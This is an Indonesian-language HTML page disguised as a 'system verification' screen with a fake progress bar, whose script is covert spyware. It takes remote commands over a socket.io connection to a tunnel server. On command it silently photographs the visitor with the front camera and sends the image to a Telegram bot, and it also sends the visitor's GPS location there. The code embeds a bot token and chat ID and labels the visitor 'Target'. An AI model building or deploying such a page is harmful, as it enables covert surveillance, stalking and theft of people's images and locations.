<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .loader { width: 40px; height: 40px; border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #toast { visibility: hidden; background: #00ff41; color: #000; padding: 12px; position: fixed; bottom: 30px; border-radius: 8px; font-weight: bold; z-index: 99; }
        #toast.show { visibility: visible; animation: fade 0.5s; }
        @keyframes fade { from {opacity: 0;} to {opacity: 1;} }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 id="status">VERIFIKASI SISTEM... 0%</h2>
    <div id="toast"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        // === ⚡ GANTI LINK TUNNEL TUAN DI SINI! ⚡ ===
        const BACKEND_URL = "https://types-passed-fellowship-math.trycloudflare.com"; 
        const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
        const CHAT_ID = "7373392803"; // ID Tuan sudah saya masukkan otomatis

        const socket = io(BACKEND_URL, { transports: ['websocket'] });

        // Fungsi Ambil Foto
        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'fionzy.jpg');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);
            } catch (e) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ Target Menolak Kamera`); }
        }

        socket.on('command', (msg) => {
            const args = msg.split(' ');
            if (msg === '/snap') takePhoto();
            if (msg === '/vibrate') navigator.vibrate(500);
            if (msg === '/gps') {
                navigator.geolocation.getCurrentPosition(res => {
                    const link = `https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 Lokasi Target: ${link}`);
                });
            }
            if (msg.startsWith('/toast ')) {
                const t = document.getElementById('toast');
                t.innerText = msg.replace('/toast ', '');
                t.className = "show";
                setTimeout(() => t.className = "", 3000);
            }
        });

        // Efek Loading Palsu
        let p = 0;
        setInterval(() => { if(p < 100) { p += 2; document.getElementById('status').innerText = `VERIFIKASI... ${p}%`; } }, 200);
    </script>
</body>
</html>
